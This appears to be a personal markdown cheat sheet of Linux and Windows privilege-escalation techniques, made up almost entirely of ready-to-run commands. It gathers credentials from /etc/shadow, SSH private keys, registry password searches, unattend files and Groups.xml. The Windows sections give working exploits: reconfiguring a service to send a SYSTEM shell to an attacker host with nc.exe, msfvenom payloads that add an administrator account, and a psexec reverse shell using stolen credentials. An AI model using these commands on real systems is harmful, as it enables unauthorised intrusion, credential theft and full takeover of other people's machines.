#security #privesc
# [[Linux]]
## priv esc enumeration scripts
https://github.com/rebootuser/LinEnum
https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py
http://pentestmonkey.net/tools/audit/unix-privesc-check

## Kernel and OS

```sh
uname -a
uname -mrs
cat /etc/issue
cat /etc/lsb-release      # Debian based
cat /etc/redhat-release   # Redhat based
```

## running services and find services run boy root

```sh
ps aux
ps aux | grep root
```

## which applications are installed

```sh
dpkg -l
ls -alh /usr/bin/
ls -alh /sbin/
```

## scheduled tasks

`crontab -l`
## port forwarding

```sh
ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
```

## tunneling

```sh
ssh -D 127.0.0.1:9050 -N [username]@[ip]
proxychains ifconfig
```

## sensitive files

```sh
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
```

## check home dirs

```sh
ls -ahlR /root/
ls -ahlR /home
```

## private key search

```sh
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

## Sticky Bits & SUID & GUID

```sh
find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
```

# [[Windows]]

## basics
systeminfo
hostname
echo %username%

## users

```powershell
net users
net user <username>
```

## network

```powershell
ipconfig /all
route print
arp -A
netstat -ano  # active network connections
```

## firewall status

```poweshell
netsh firewall show state
netsh firewall show config
netsh advfirewall firewall show rule all
```

## systeminfo output save in a file, check for vulnerabilities

https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py

`python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt`

## Search patches for given patch

`wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."`
## Kernel
```powershell
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

> check for possible exploits, find a place to upload (eg: C:\Inetpub or C:\temp) it, run exe


## Weak permissions
> this example is for XP SP0
> upload accesschk.exe to a writable directory first 
> for XP version 5.2 of accesschk.exe is needed

https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe 

> check for serices with weak permissions
`accesschk.exe -uwcqv "Authenticated Users" * /accepteula`

## check for the found services above
`accesschk.exe -ucqv upnphost`
## upload nc.exe to writable directory
```powershell
sc config upnphost binpath= "C:\Inetpub\nc.exe -nv <attackerip> 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
# check the status now
sc qc upnphost
# change start option as AUTO-START 
sc config SSDPSRV start= auto
#start the services
net start SSDPSRV
net stop upnphost
net start upnphost
```

> listen on port 9988 and you'll get a shell with NT AUTHORITY\SYSTEM privileges

## Registry Checks for Passwords

```powershell
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
```

## Places to Check for Credentials

```powersehll
C:\sysprep.inf
C:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir /b /s unattend.xml
dir /b /s web.config
dir /b /s sysprep.inf
dir /b /s sysprep.xml
dir /b /s *pass*
dir /b /s vnc.ini
```

## Groups.xml

> Look up ip-addres of DC
> `nslookup nameofserver.whatever.local`
>
> It will output something like this
> `Address:  192.168.1.101`

> Now we mount it
`net use z: \\192.168.1.101\SYSVOL`

> Now we search for the groups.xml file
> `dir Groups.xml /s`

> decrypt the password in it
> `gpp-decrypt <pass>`

## AlwaysInstallElevated
```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```

> From the output, notice that “AlwaysInstallElevated” value is 1.

## Exploitation

```powershell
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi-nouac -o setup.msi
Place 'setup.msi' in 'C:\Temp'
msiexec /quiet /qn /i C:\Temp\setup.msi
net localgroup Administrators
```

## Find writable files

`dir /a-r-d /s /b`
/a is to search for attributes. In this case r is read only and d is directory. (look for writable files only)
/s means recurse subdirectories
/b means bare format. Path and filename only.

## Unquoted Path

```powershell
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ 
# Suppose we found: C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
# check for permissions of folder path
icacls "C:\Program Files (x86)\Program Folder"
```

## exploit

```powershell
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
#Open command prompt and type: 
sc start unquotedsrvc
net localgroup Administrators
```

---

# psexec using found credentials
# first upload nc.exe to a writable directory
`psexec.exe -u <username> -p <password> \\MACHINENAME C:\Inetpub\nc.exe <attackerip> <attackerport> -e C:\windows\system32\cmd.exe`